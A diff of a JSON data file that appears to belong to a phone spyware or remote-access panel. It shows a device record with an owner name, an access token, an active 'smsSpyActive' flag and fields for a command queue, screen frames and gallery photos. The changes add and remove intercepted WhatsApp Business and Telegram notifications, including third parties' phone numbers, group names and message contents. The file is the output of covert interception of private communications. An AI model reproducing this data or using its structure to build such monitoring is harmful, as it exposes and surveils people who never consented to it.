@@ -303,7 +303,7 @@
     "deviceName": "HP-SAYANG-4049",
     "ownerUsername": "GANANG",
     "token": "a70009f8a5d81c6b767372cdc0d6c979",
-    "lastSeen": 1775637089567,
+    "lastSeen": 1775637092572,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-08T06:28:11.035Z",
@@ -319,6 +319,54 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WA Business",
+        "sender": "+62 898-7564-441",
+        "content": "🎥 Kumaha ieu? (0.05)",
+        "time": "08/04 15:31",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775637093156
+      },
+      {
+        "appName": "WA Business",
+        "sender": "+62 857-8951-4723",
+        "content": "Kalo aja nanti gua mau buy tapi belom ada ubah jdi SV an aja dulu",
+        "time": "08/04 15:31",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775637093050
+      },
+      {
+        "appName": "WA Business",
+        "sender": "WA Business",
+        "content": "‎‎6 pesan dari 3 chat",
+        "time": "08/04 15:31",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775637092479
+      },
+      {
+        "appName": "WA Business",
+        "sender": "𝙏𝙀𝘼𝙈 𝙉𝘼𝙓𝙍𝘼𝙏: Membalas Anda",
+        "content": "~ 𝙇𝙪𝙯𝙝𝙖𝙣: Pelaku nya no nya mana?",
+        "time": "08/04 15:31",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775637092468
+      },
+      {
+        "appName": "Telegram",
+        "sender": "𝗥𝗢𝗖𝗞𝗬 𝗧𝗘𝗔𝗠 🚩",
+        "content": "Voice message",
+        "time": "08/04 15:31",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775637091686
+      },
+      {
+        "appName": "Telegram",
+        "sender": "TEAM ZANXRES: You",
+        "content": "T̴̕ ̐͒ T̴̕ ̐͒ joined to the group TEAM ZANXRES via invite link",
+        "time": "08/04 15:31",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775637091646
+      },
       {
         "appName": "Telegram",
         "sender": "ALL BUYYER GOJO HARIAN: Gok",
@@ -4270,54 +4318,6 @@
         "time": "08/04 14:40",
         "pkg": "com.whatsapp.w4b",
         "receivedAt": 1775634049952
-      },
-      {
-        "appName": "WA Business",
-        "sender": "+62 898-7564-441",
-        "content": "Sbar",
-        "time": "08/04 14:40",
-        "pkg": "com.whatsapp.w4b",
-        "receivedAt": 1775634049858
-      },
-      {
-        "appName": "Telegram",
-        "sender": "ALL BUYYER GOJO HARIAN: Rose",
-        "content": "File",
-        "time": "08/04 14:40",
-        "pkg": "org.telegram.messenger.web",
-        "receivedAt": 1775634005414
-      },
-      {
-        "appName": "Telegram",
-        "sender": "𝗥𝗢𝗖𝗞𝗬 𝗧𝗘𝗔𝗠 🚩",
-        "content": "Voice message",
-        "time": "08/04 14:40",
-        "pkg": "org.telegram.messenger.web",
-        "receivedAt": 1775634005402
-      },
-      {
-        "appName": "Telegram",
-        "sender": "STORE Reski",
-        "content": "JDI? BELIK YANG MN?",
-        "time": "08/04 14:40",
-        "pkg": "org.telegram.messenger.web",
-        "receivedAt": 1775634005397
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Telegram",
-        "content": "15 new messages from 13 chats",
-        "time": "08/04 14:40",
-        "pkg": "org.telegram.messenger.web",
-        "receivedAt": 1775634005232
-      },
-      {
-        "appName": "Telegram",
-        "sender": "STORE Reski",
-        "content": "JDI? BELIK YANG MN?",
-        "time": "08/04 14:40",
-        "pkg": "org.telegram.messenger.web",
-        "receivedAt": 1775634004235
       }
     ],
     "galleryPhotos": [],
